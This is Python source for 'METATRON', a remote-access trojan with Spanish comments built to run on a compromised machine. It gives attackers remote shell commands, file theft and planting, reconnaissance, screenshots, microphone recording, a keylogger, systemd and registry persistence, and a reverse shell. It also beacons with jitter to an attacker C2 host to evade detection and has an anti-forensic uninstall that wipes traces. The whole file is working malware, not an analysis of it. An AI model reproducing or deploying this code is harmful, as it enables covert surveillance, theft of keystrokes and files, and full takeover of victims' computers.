#!/usr/bin/env python3
"""
victim_agent.py - Agente persistente para ejecutar en máquina comprometida.

Communicación: HTTP/JSON cifrado (XOR + base64) con la key compartida.
Modos:
  bind   - Escucha en un puerto (default)
  beacon - Reverse HTTP polling a METATRON (atraviesa NAT/firewall)

Módulos:
  ping, shell, fs_ls, fs_cat, fs_tree, upload, upload_chunk,
  info, processes, processes_kill, network,
  screenshot, audio, keylog_start, keylog_stop, keylog_dump,
  persist, revshell, uninstall, help

Uso:
    metatron-agent --port 4477 --key MiClave
    metatron-agent --mode beacon --c2 http://atacante:8000/api/beacon --key MiClave
"""
import sys
import os
import json
import base64
import subprocess
import socket
import threading
import time
import uuid
import re
import hmac
import struct
import signal
import random
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from urllib.parse import urlparse, parse_qs

try:
    import http.client as httpclient
except ImportError:
    import httplib as httpclient

AGENT_VERSION = "2.0.0"
AGENT_NAME = "metatron-agent"
DEFAULT_PORT = 4477
AUTH_KEY = "metatron_default_key"
C2_URL = None  # Beacon mode: http://atacante:8000/api/beacon
C2_INTERVAL = 30  # Beacon poll interval (segundos)
C2_JITTER = 0.3  # ±30% jitter para evitar detección por patrón

# Estado del keylogger
_keylog_state = {"thread": None, "buffer": [], "active": False}

# Estado de revshell persistente
_revshell_state = {"thread": None}


# ============================================================
# Cifrado del canal (XOR + base64)
# ============================================================

def _xor_bytes(data: bytes, key: str) -> bytes:
    if not key:
        return data
    key_bytes = key.encode().ljust(8, b"\x00")
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key_bytes[i % len(key_bytes)])
    return bytes(out)


def encrypt_payload(data: dict, key: str) -> str:
    """Cifra un dict y devuelve base64. El receptor llama a decrypt_payload."""
    raw = json.dumps(data, default=str).encode()
    encrypted = _xor_bytes(raw, key)
    return base64.b64encode(encrypted).decode()


def decrypt_payload(b64: str, key: str) -> dict:
    """Desencripta base64+cifrado a dict."""
    try:
        encrypted = base64.b64decode(b64)
        raw = _xor_bytes(encrypted, key)
        return json.loads(raw.decode())
    except Exception as e:
        return {"error": f"decrypt: {e}"}


def _hmac_sig(data: bytes, key: str) -> str:
    return hmac.new(key.encode(), data, "sha256").hexdigest()[:32]


def sign(data: dict, key: str) -> str:
    """Devuelve firma HMAC-SHA256 (truncada) del JSON serializado."""
    raw = json.dumps(data, sort_keys=True, default=str).encode()
    return _hmac_sig(raw, key)


# ============================================================
# Módulos del agente
# ============================================================

def run_shell(command, timeout: int = 30) -> dict:
    try:
        # shell=True en Unix, determina shell correcto en Windows
        use_shell = True
        if sys.platform == "win32":
            # PowerShell si está disponible, sino cmd
            shell_exe = os.environ.get("COMSPEC", "cmd.exe")
            proc = subprocess.run(
                command, shell=True, capture_output=True, text=True,
                timeout=timeout, executable=shell_exe,
            )
        else:
            proc = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=timeout,
            )
        return {
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "returncode": proc.returncode,
            "truncated": len(proc.stdout) > 100000,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "[!] Command timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": f"[!] {e}", "returncode": -1}


def list_directory(path: str = "/", recursive: bool = False, max_depth: int = 3) -> dict:
    try:
        if recursive:
            return _list_recursive(path, max_depth)
        entries = os.listdir(path)
        items = []
        for name in sorted(entries):
            try:
                full = os.path.join(path, name)
                stat = os.lstat(full)
                items.append({
                    "name": name,
                    "type": "dir" if os.path.isdir(full) else "link" if os.path.islink(full) else "file",
                    "size": stat.st_size,
                    "mode": oct(stat.st_mode)[-3:],
                    "uid": stat.st_uid,
                    "gid": stat.st_gid,
                    "mtime": stat.st_mtime,
                    "is_setuid": bool(stat.st_mode & 0o4000),
                    "is_setgid": bool(stat.st_mode & 0o2000),
                })
            except:
                items.append({"name": name, "type": "?", "size": 0, "mode": "???", "uid": 0, "gid": 0, "mtime": 0})
        return {"path": path, "items": items, "count": len(items)}
    except Exception as e:
        return {"path": path, "error": str(e), "items": [], "count": 0}


def _list_recursive(path: str, max_depth: int, depth: int = 0) -> dict:
    if depth > max_depth:
        return {"path": path, "items": [], "count": 0, "truncated": True}
    try:
        result = {"path": path, "items": [], "count": 0}
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            try:
                stat = os.lstat(full)
                item = {
                    "name": name,
                    "type": "dir" if os.path.isdir(full) else "link" if os.path.islink(full) else "file",
                    "size": stat.st_size,
                    "mode": oct(stat.st_mode)[-3:],
                    "mtime": stat.st_mtime,
                }
                if os.path.isdir(full) and not os.path.islink(full):
                    sub = _list_recursive(full, max_depth, depth + 1)
                    item["children"] = sub.get("items", [])
                result["items"].append(item)
                result["count"] += 1
            except PermissionError:
                pass
            except:
                pass
        return result
    except:
        return {"path": path, "items": [], "count": 0}


def read_file(path: str, max_bytes: int = 100000, offset: int = 0) -> dict:
    try:
        stat = os.stat(path)
        size = stat.st_size
        with open(path, "rb") as f:
            if offset:
                f.seek(offset)
            data = f.read(max_bytes)
        return {
            "path": path,
            "size": size,
            "offset": offset,
            "read_bytes": len(data),
            "has_more": (offset + len(data)) < size,
            "is_text": _is_probably_text(data),
            "content_b64": base64.b64encode(data).decode(),
            "mtime": stat.st_mtime,
            "mode": oct(stat.st_mode)[-3:],
        }
    except Exception as e:
        return {"path": path, "error": str(e)}


def _is_probably_text(data: bytes) -> bool:
    try:
        data.decode("utf-8")
        return True
    except:
        pass
    return False


def read_file_chunked(path: str, chunk_b64: str, offset: int = 0) -> dict:
    """Sube un chunk recibido a un archivo en la víctima (modo append)."""
    try:
        data = base64.b64decode(chunk_b64)
        # Si offset==0, crear/truncar; sino append
        mode = "ab" if offset > 0 else "wb"
        dstdir = os.path.dirname(path)
        if dstdir and not os.path.exists(dstdir):
            os.makedirs(dstdir, exist_ok=True)
        with open(path, mode) as f:
            f.write(data)
        return {
            "success": True,
            "path": path,
            "written": len(data),
            "current_size": os.path.getsize(path),
            "next_offset": os.path.getsize(path),
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def get_system_info() -> dict:
    info = {"hostname": socket.gethostname(), "timestamp": datetime.now().isoformat()}
    try:
        info["os"] = _read_first("/etc/os-release") or _read_first("/etc/issue") or os.name
        info["kernel"] = _run("uname -a").get("stdout", "").strip() if sys.platform != "win32" else _run("ver").get("stdout", "").strip()
        info["uptime"] = _run("uptime -p 2>/dev/null || uptime" if sys.platform != "win32" else "net statistics workstation | findstr /i \"Estadísticas\"").get("stdout", "").strip()
        info["cpu"] = _run("cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1" if sys.platform != "win32" else "wmic cpu get name").get("stdout", "").strip()
        info["mem"] = _run("free -h 2>/dev/null | head -2" if sys.platform != "win32" else "wmic OS get FreePhysicalMemory,TotalVisibleMemorySize").get("stdout", "").strip()
        info["disks"] = _run("df -h 2>/dev/null" if sys.platform != "win32" else "fsutil volume diskfree C:").get("stdout", "").strip()
        info["users"] = _run("cat /etc/passwd 2>/dev/null | grep -E '/bin/bash|/bin/sh|/bin/zsh' | cut -d: -f1" if sys.platform != "win32" else "net user").get("stdout", "").strip()
        info["current_user"] = _run("whoami 2>/dev/null || id").get("stdout", "").strip()
        info["is_root"] = (sys.platform != "win32" and os.geteuid() == 0) or (sys.platform == "win32" and _run("net session >nul 2>&1 && echo admin").get("returncode") == 0)
        info["interfaces"] = _run("ip addr 2>/dev/null || ifconfig 2>/dev/null" if sys.platform != "win32" else "ipconfig /all").get("stdout", "").strip()
        info["connections"] = _run("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null" if sys.platform != "win32" else "netstat -ano | findstr LISTENING").get("stdout", "").strip()
        info["processes"] = _run("ps aux 2>/dev/null | head -40" if sys.platform != "win32" else "tasklist | findstr /v \"Image\"").get("stdout", "").strip()
        info["suid"] = _run("find / -perm -4000 -type f 2>/dev/null | head -20" if sys.platform != "win32" else "echo 'n/a en windows'").get("stdout", "").strip()
        info["env"] = "\n".join(f"{k}={v}" for k, v in list(os.environ.items())[:30])
        info["arch"] = _run("uname -m" if sys.platform != "win32" else "echo %PROCESSOR_ARCHITECTURE%").get("stdout", "").strip()
        info["python_version"] = sys.version
        info["platform"] = sys.platform
    except Exception as e:
        info["error"] = str(e)
    return info


def get_processes() -> list:
    procs = []
    if sys.platform == "win32":
        output = _run("tasklist /v /fo csv").get("stdout", "")
        # Parsear CSV muy básicamente
        for line in output.split("\n")[1:]:
            try:
                fields = re.findall(r'"([^"]*)"', line)
                if len(fields) >= 2:
                    procs.append({"name": fields[0], "pid": fields[1], "user": fields[-1] if len(fields) > 5 else ""})
            except:
                pass
    else:
        output = _run("ps aux 2>/dev/null").get("stdout", "")
        lines = output.strip().split("\n")[1:]
        for line in lines[:150]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                procs.append({
                    "user": parts[0], "pid": parts[1], "cpu": parts[2], "mem": parts[3],
                    "vsz": parts[4], "rss": parts[5], "tty": parts[6], "stat": parts[7],
                    "start": parts[8], "time": parts[9], "cmd": parts[10],
                })
    return procs


def kill_process(pid: int, signal_name: str = "TERM") -> dict:
    """Mata un proceso por PID."""
    try:
        sig = signal_name.upper()
        sig_map = {"TERM": 15, "KILL": 9, "HUP": 1, "INT": 2, "STOP": 19, "CONT": 18}
        if sys.platform == "win32":
            r = _run(f"taskkill /F /PID {pid}")
            return {"success": r["returncode"] == 0, "pid": pid, "output": r["stdout"] + r["stderr"]}
        else:
            sig_num = sig_map.get(sig, 15)
            os.kill(int(pid), sig_num)
            return {"success": True, "pid": pid, "signal": sig}
    except Exception as e:
        return {"success": False, "pid": pid, "error": str(e)}


def get_network() -> dict:
    if sys.platform == "win32":
        return {
            "interfaces": _run("ipconfig /all").get("stdout", ""),
            "connections": _run("netstat -ano | findstr LISTENING").get("stdout", ""),
            "route": _run("route print").get("stdout", ""),
            "dns": _run("ipconfig /all | findstr DNS").get("stdout", ""),
            "hostname": socket.gethostname(),
        }
    return {
        "interfaces": _run("ip -o addr 2>/dev/null || ifconfig 2>/dev/null").get("stdout", ""),
        "connections": _run("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null").get("stdout", ""),
        "route": _run("ip route 2>/dev/null || route -n 2>/dev/null").get("stdout", ""),
        "dns": _read_first("/etc/resolv.conf") or "",
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
    }


def take_screenshot() -> dict:
    out_path = f"/tmp/__metatron_ss_{int(time.time())}.png" if sys.platform != "win32" else os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"__metatron_ss_{int(time.time())}.png")
    
    if sys.platform == "win32":
        try:
            # PowerShell screenshot usando System.Drawing
            ps_script = (
                f"Add-Type -AssemblyName System.Windows.Forms;"
                f"$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
                f"$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height);"
                f"$g = [System.Drawing.Graphics]::FromImage($bmp);"
                f"$g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size);"
                f"$bmp.Save('{out_path}');"
                f"$g.Dispose(); $bmp.Dispose()"
            )
            r = _run(f'powershell -Command "{ps_script}"', timeout=15)
            if os.path.exists(out_path):
                with open(out_path, "rb") as f:
                    b64 = base64.b64encode(f.read()).decode()
                os.unlink(out_path)
                return {"success": True, "format": "png", "data_b64": b64, "size": len(b64)}
            return {"success": False, "error": "PowerShell screenshot falló: " + r.get("stderr", "")}
        except Exception as e:
            return {"success": False, "error": str(e)}
    else:
        try:
            for cmd in [
                f"import -window root {out_path} 2>/dev/null",
                f"scrot {out_path} 2>/dev/null",
                f"gnome-screenshot -f {out_path} 2>/dev/null",
            ]:
                r = _run(cmd)
                if r["returncode"] == 0 and os.path.exists(out_path):
                    with open(out_path, "rb") as f:
                        b64 = base64.b64encode(f.read()).decode()
                    try:
                        os.unlink(out_path)
                    except:
                        pass
                    return {"success": True, "format": "png", "data_b64": b64, "size": len(b64)}
            return {"success": False, "error": "No screenshot tool (import/scrot/gnome-screenshot)"}
        except Exception as e:
            return {"success": False, "error": str(e)}


def record_audio(duration: int = 5) -> dict:
    out_path = f"/tmp/__metatron_audio_{int(time.time())}.wav" if sys.platform != "win32" else os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"__metatron_audio_{int(time.time())}.wav")
    if sys.platform == "win32":
        # SoundRecorder.exe en Win no es scriptable fácilmente. Avisar al usuario.
        return {"success": False, "error": "Audio capture en Windows requiere pyaudio. Instalá con: pip install pyaudio"}
    try:
        r = _run(f"arecord -d {duration} -f cd -t wav {out_path} 2>/dev/null", timeout=duration + 5)
        if r["returncode"] != 0 or not os.path.exists(out_path):
            return {"success": False, "error": "arecord falló (instalá: apt install alsa-utils)"}
        with open(out_path, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
        try:
            os.unlink(out_path)
        except:
            pass
        return {"success": True, "format": "wav", "data_b64": b64, "duration": duration, "size": len(b64)}
    except Exception as e:
        return {"success": False, "error": str(e)}


def start_keylogger() -> dict:
    """Inicia un keylogger básico leyendo /dev/input/event* (Linux) o usando msvcrt en Win."""
    if _keylog_state["active"]:
        return {"success": False, "error": "Keylogger ya está corriendo"}
    if sys.platform == "win32":
        return {"success": False, "error": "Keylogger Windows requiere pywin32. Incluir como módulo aparte."}
    # Linux: leer /dev/input/event* (requiere root o input group)
    try:
        kbd = None
        for f in os.listdir("/dev/input/by-path"):
            if "event-kbd" in f:
                kbd = os.path.realpath("/dev/input/by-path/" + f)
                break
        if not kbd:
            for f in os.listdir("/dev/input"):
                if f.startswith("event"):
                    kbd = "/dev/input/" + f
                    break
        if not kbd:
            return {"success": False, "error": "No se encontró /dev/input/event* (¿tenés root?)"}
        
        def _kl_thread():
            _keylog_state["active"] = True
            try:
                with open(kbd, "rb") as f:
                    while _keylog_state["active"]:
                        data = f.read(24)
                        if len(data) == 24:
                            tv_sec, tv_usec, typ, code, value = struct.unpack("@LLHHI", data)
                            if typ == 1 and value == 1:  # EV_KEY, key down
                                key_name = _key_code_to_name(code)
                                if key_name:
                                    _keylog_state["buffer"].append(key_name)
            except Exception as e:
                _keylog_state["buffer"].append(f"[err:{e}]")
        
        t = threading.Thread(target=_kl_thread, daemon=True)
        _keylog_state["thread"] = t
        t.start()
        return {"success": True, "device": kbd, "msg": "Keylogger iniciado"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def stop_keylogger() -> dict:
    _keylog_state["active"] = False
    return {"success": True, "stopped_keys": len(_keylog_state.get("buffer", []))}


def dump_keylogger() -> dict:
    keys = _keylog_state.get("buffer", [])
    text = "".join(keys)
    _keylog_state["buffer"] = []
    return {"success": True, "keys": keys, "text": text[:50000]}


_KEY_MAP = {
    1: "[ESC]", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BS]", 15: "[TAB]", 16: "q", 17: "w", 18: "e", 19: "r",
    20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[", 27: "]", 28: "[ENTER]",
    29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k",
    38: "l", 39: ";", 40: "'", 41: "`", 42: "[LSHIFT]", 43: "\\", 44: "z", 45: "x", 46: "c",
    47: "v", 48: "b", 49: "n", 50: "m", 51: ",", 52: ".", 53: "/", 54: "[RSHIFT]", 57: " ",
    58: "[CAPS]", 59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]", 64: "[F6]",
    65: "[F7]", 66: "[F8]", 67: "[F9]", 68: "[F10]", 87: "[F11]", 88: "[F12]",
}


def _key_code_to_name(code: int) -> str:
    return _KEY_MAP.get(code, f"[{code}]")


def persist() -> dict:
    """Instala el agente para persistencia. Linux: systemd. Windows: HKCU/HKLM + schtasks."""
    if sys.platform == "win32":
        try:
            script = os.path.abspath(sys.argv[0] if getattr(sys, "frozen", False) else __file__)
            # Agregar al inicio del registry
            _run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v MetatronAgent /t REG_SZ /d "{script} --port 4477 --key {AUTH_KEY}" /f')
            # También como scheduled task
            _run(f'schtasks /create /tn "MetatronAgent" /tr "{script} --port 4477 --key {AUTH_KEY}" /sc onlogon /rl highest /f')
            return {"success": True, "method": "HKCU Run + schtasks", "exec": script}
        except Exception as e:
            return {"success": False, "error": str(e)}
    else:
        if os.geteuid() != 0:
            return {"success": False, "error": "Requiere root"}
        try:
            script = os.path.abspath(sys.argv[0] if getattr(sys, "frozen", False) else __file__)
            dest = "/usr/local/bin/metatron-agent"
            service = "/etc/systemd/system/metatron-agent.service"
            _run(f"cp {script} {dest} && chmod +x {dest}")
            svc_content = f"""[Unit]
Description=METATRON Agent
After=network.target

[Service]
Type=simple
ExecStart={dest} --port {DEFAULT_PORT} --key {AUTH_KEY}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            with open(service, "w") as f:
                f.write(svc_content)
            _run("systemctl daemon-reload && systemctl enable metatron-agent && systemctl start metatron-agent")
            return {"success": True, "path": dest, "service": service, "port": DEFAULT_PORT}
        except Exception as e:
            return {"success": False, "error": str(e)}


def revshell(host: str, port: int) -> dict:
    """Levanta un revshell en background que conecta a host:port."""
    if _revshell_state["thread"] and _revshell_state["thread"].is_alive():
        return {"success": False, "error": "Revshell ya está activo"}
    
    def _rs_thread():
        try:
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    s.connect((host, port))
                    s.sendall(b"[*] METATRON revshell connected\n")
                    while True:
                        s.sendall(b"$ ")
                        data = s.recv(1024)
                        if not data:
                            break
                        cmd = data.decode().strip()
                        if cmd.lower() in ("exit", "quit"):
                            break
                        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                        s.sendall(r.stdout.encode() + r.stderr.encode())
                except:
                    time.sleep(5)
                finally:
                    s.close()
        except:
            pass
    
    t = threading.Thread(target=_rs_thread, daemon=True)
    _revshell_state["thread"] = t
    t.start()
    return {"success": True, "host": host, "port": port, "msg": "Revshell iniciado. Listener: nc -lvnp <port>"}


def uninstall() -> dict:
    """Anti-forense: elimina el agente de la víctima."""
    if sys.platform != "win32":
        # Linux: para el servicio, lo desinstala y borra
        _run("systemctl stop metatron-agent 2>/dev/null")
        _run("systemctl disable metatron-agent 2>/dev/null")
        _run("rm -f /etc/systemd/system/metatron-agent.service")
        _run("systemctl daemon-reload")
        _run("rm -f /usr/local/bin/metatron-agent")
        # Borrar historial de bash del agente
        _run("history -c 2>/dev/null")
        # Eliminar logs del agente (si los hay)
        _run("rm -rf /tmp/.metatron_*")
        return {"success": True, "msg": "Agente desinstalado en Linux"}
    else:
        # Windows
        _run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v MetatronAgent /f')
        _run('schtasks /delete /tn "MetatronAgent" /f')
        _run('del /Q "%TEMP%\\__metatron_*"')
        return {"success": True, "msg": "Agente desinstalado en Windows"}


def stats() -> dict:
    """Stats internos del agente."""
    return {
        "version": AGENT_VERSION,
        "uptime_since": _agent_started.isoformat() if _agent_started else None,
        "keylogger_active": _keylog_state["active"],
        "keylog_buffer_size": len(_keylog_state.get("buffer", [])),
        "revshell_active": _revshell_state["thread"] and _revshell_state["thread"].is_alive(),
        "mode": "beacon" if C2_URL else "bind",
    }


# ============================================================
# Helpers
# ============================================================

def _run(cmd: str, timeout: int = 15) -> dict:
    try:
        if sys.platform == "win32":
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        else:
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"stdout": proc.stdout, "stderr": proc.stderr, "returncode": proc.returncode}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


def _read_first(path: str) -> str:
    try:
        with open(path, "r") as f:
            return f.read().strip()
    except:
        return ""


_agent_started = datetime.now()


# ============================================================
# Registry de módulos
# ============================================================

AGENT_HANDLERS = {
    "ping": lambda args: {"status": "ok", "version": AGENT_VERSION, "time": datetime.now().isoformat()},
    "stats": lambda args: stats(),
    "shell": lambda args: run_shell(args.get("command", ""), args.get("timeout", 30)),
    "fs_ls": lambda args: list_directory(args.get("path", "/"), args.get("recursive", False), args.get("max_depth", 3)),
    "fs_cat": lambda args: read_file(args.get("path", ""), args.get("max_bytes", 100000), args.get("offset", 0)),
    "upload": lambda args: read_file_chunked(args.get("dst", ""), args.get("data_b64", ""), 0),
    "upload_chunk": lambda args: read_file_chunked(args.get("dst", ""), args.get("data_b64", ""), args.get("offset", 0)),
    "info": lambda args: get_system_info(),
    "processes": lambda args: get_processes(),
    "processes_kill": lambda args: kill_process(args.get("pid"), args.get("signal", "TERM")),
    "network": lambda args: get_network(),
    "screenshot": lambda args: take_screenshot(),
    "audio": lambda args: record_audio(args.get("duration", 5)),
    "keylog_start": lambda args: start_keylogger(),
    "keylog_stop": lambda args: stop_keylogger(),
    "keylog_dump": lambda args: dump_keylogger(),
    "persist": lambda args: persist(),
    "revshell": lambda args: revshell(args.get("host", ""), int(args.get("port", 4444))),
    "uninstall": lambda args: uninstall(),
}


# ============================================================
# Bind mode - HTTP Server
# ============================================================

class AgentHandler(BaseHTTPRequestHandler):
    
    def _auth(self) -> bool:
        # Soporta: X-Auth-Key directo, o X-Sig (HMAC) + cuerpo cifrado
        auth = self.headers.get("X-Auth-Key", "")
        return auth == AUTH_KEY or self.headers.get("X-Sig")
    
    def _json_response(self, data: dict, status: int = 200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Auth-Key, X-Sig, X-Encrypted")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.end_headers()
        # Si el request vino cifrado, devolver cifrado también
        is_encrypted = self.headers.get("X-Encrypted", "") == "1"
        if is_encrypted:
            enc = encrypt_payload(data, AUTH_KEY)
            self.wfile.write(enc.encode())
        else:
            self.wfile.write(json.dumps(data, default=str).encode())
    
    def do_OPTIONS(self):
        self._json_response({"status": "ok"})
    
    def do_POST(self):
        if not self._auth():
            self._json_response({"error": "unauthorized"}, 401)
            return
        
        parsed = urlparse(self.path)
        path = parsed.path.strip("/")
        
        content_len = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_len) if content_len else b"{}"
        
        # Soporta cuerpo cifrado (X-Encrypted: 1)
        is_encrypted = self.headers.get("X-Encrypted", "") == "1"
        if is_encrypted:
            args = decrypt_payload(body.decode(), AUTH_KEY)
        else:
            try:
                args = json.loads(body)
            except:
                args = {}
        
        query = parse_qs(parsed.query)
        for k, v in query.items():
            if k not in args:
                args[k] = v[0] if len(v) == 1 else v
        
        if path in AGENT_HANDLERS:
            try:
                result = AGENT_HANDLERS[path](args)
                self._json_response({"status": "ok", "module": path, "result": result})
            except Exception as e:
                self._json_response({"status": "error", "module": path, "error": str(e)}, 500)
        elif path in ("", "help"):
            self._json_response({
                "status": "ok",
                "agent": AGENT_NAME,
                "version": AGENT_VERSION,
                "modules": list(AGENT_HANDLERS.keys()),
                "encrypted_channel": True,
                "current_mode": "bind" if not C2_URL else "beacon",
            })
        else:
            self._json_response({"status": "error", "error": f"Unknown module: {path}"}, 404)
    
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/" or parsed.path == "/help":
            self.do_POST()
            return
        self._json_response({"error": "Use POST"}, 405)
    
    def log_message(self, format, *args):
        pass  # silencioso


def start_bind_server(port: int):
    """Inicia el servidor HTTP en modo BIND."""
    server = HTTPServer(("0.0.0.0", port), AgentHandler)
    print(f"[*] {AGENT_NAME} v{AGENT_VERSION} (bind mode) on 0.0.0.0:{port}")
    print(f"[*] Modulos: {', '.join(AGENT_HANDLERS.keys())}")
    
    def shutdown(sig, frame):
        print("\n[*] Deteniendo...")
        server.shutdown()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, shutdown)
    if sys.platform != "win32":
        signal.signal(signal.SIGTERM, shutdown)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


# ============================================================
# Beacon mode - Reverse HTTP polling a C2
# ============================================================

def start_bacon_mode(c2_url: str):
    """Polls METATRON cada N segundos esperando comandos. Atraviesa NAT/firewall."""
    global C2_URL, C2_INTERVAL, C2_JITTER
    parsed = urlparse(c2_url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/api/beacon"
    
    print(f"[*] {AGENT_NAME} v{AGENT_VERSION} (beacon mode) -> {c2_url}")
    print(f"[*] Interval: {C2_INTERVAL}s ±{int(C2_JITTER*100)}% jitter")
    
    # Registrar al arranque
    register = {
        "agent": AGENT_NAME,
        "version": AGENT_VERSION,
        "hostname": socket.gethostname(),
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "platform": sys.platform,
        "started_at": _agent_started.isoformat(),
    }
    
    _beacon_send(host, port, path, "register", register)
    
    while True:
        # Jitter aleatorio
        sleep_secs = C2_INTERVAL * (1 + (random.random() - 0.5) * 2 * C2_JITTER)
        time.sleep(max(1, sleep_secs))
        
        # Stats para el heartbeat
        try:
            cmd = _beacon_send(host, port, path, "poll", stats())
            if cmd and isinstance(cmd, dict) and cmd.get("module"):
                # Ejecutar comando entrante
                module = cmd.get("module")
                args = cmd.get("args", {})
                if module in AGENT_HANDLERS:
                    result = AGENT_HANDLERS[module](args)
                    _beacon_send(host, port, path, "result", {"module": module, "result": result, "job_id": cmd.get("job_id")})
        except Exception as e:
            print(f"[!] beacon error: {e}")


def _beacon_send(host, port, path, action, payload):
    """Envía una request POST al C2 con el payload cifrado."""
    try:
        body = encrypt_payload({"action": action, "data": payload}, AUTH_KEY)
        headers = {"Content-Type": "text/plain", "X-Auth-Key": AUTH_KEY, "X-Encrypted": "1"}
        conn = httpclient.HTTPConnection(host, port, timeout=15)
        conn.request("POST", path + "?action=" + action, body=body, headers=headers)
        r = conn.getresponse()
        data = r.read().decode()
        conn.close()
        if data:
            return decrypt_payload(data, AUTH_KEY)
        return None
    except Exception as e:
        print(f"[!] beacon_send fail: {e}")
        return None


# ============================================================
# Auto-detección de modo (frozen/binario embebido)
# ============================================================

def is_frozen() -> bool:
    """True si el agente está corriendo como binario compilado (PyInstaller)."""
    return getattr(sys, "frozen", False)


# ============================================================
# Main
# ============================================================

def print_help():
    print(f"""{AGENT_NAME} v{AGENT_VERSION}
Agente persistente para administración remota de máquinas comprometidas.

MODO BIND (escucha en puerto):
    {AGENT_NAME} --port 4477 --key MiClave
    {AGENT_NAME} --port 4477 --key MiClave --encrypt

MODO BEACON (reverse HTTP a C2 — atraviesa NAT):
    {AGENT_NAME} --mode beacon --c2 http://atacante:8000/api/beacon --key MiClave

Opciones:
    --port PUERTO    Puerto para bind mode (defecto: {DEFAULT_PORT})
    --key KEY        Clave de autenticación (defecto: metatron_default_key)
    --mode MODE      bind | beacon (defecto: bind)
    --c2 URL         URL del C2 en modo beacon (ej: http://10.0.0.5:8000/api/beacon)
    --interval N     Intervalo de beacon en segundos (defecto: 30)
    --jitter N       Jitter del beacon 0-1 (defecto: 0.3 = 30%)
    --encrypted      Fuerza canal cifrado (XOR+base64 por defecto ya disponible)
    --help           Esta ayuda

Binario compilado con PyInstaller. No requiere Python instalado.
""")


if __name__ == "__main__":
    port = DEFAULT_PORT
    key = ""
    mode = "bind"
    c2_url = ""
    
    args = sys.argv[1:]
    for i, arg in enumerate(args):
        if arg == "--port" and i + 1 < len(args):
            port = int(args[i + 1])
        elif arg == "--key" and i + 1 < len(args):
            key = args[i + 1]
        elif arg == "--mode" and i + 1 < len(args):
            mode = args[i + 1]
        elif arg == "--c2" and i + 1 < len(args):
            c2_url = args[i + 1]
        elif arg == "--interval" and i + 1 < len(args):
            C2_INTERVAL = int(args[i + 1])
        elif arg == "--jitter" and i + 1 < len(args):
            C2_JITTER = float(args[i + 1])
        elif arg in ("--help", "-h"):
            print_help()
            sys.exit(0)
    
    if key:
        AUTH_KEY = key
    
    if is_frozen():
        print(f"[*] Corriendo como binario standalone ({sys.platform})")
    
    if mode == "beacon" and c2_url:
        C2_URL = c2_url
        start_bacon_mode(c2_url)
    else:
        start_bind_server(port)
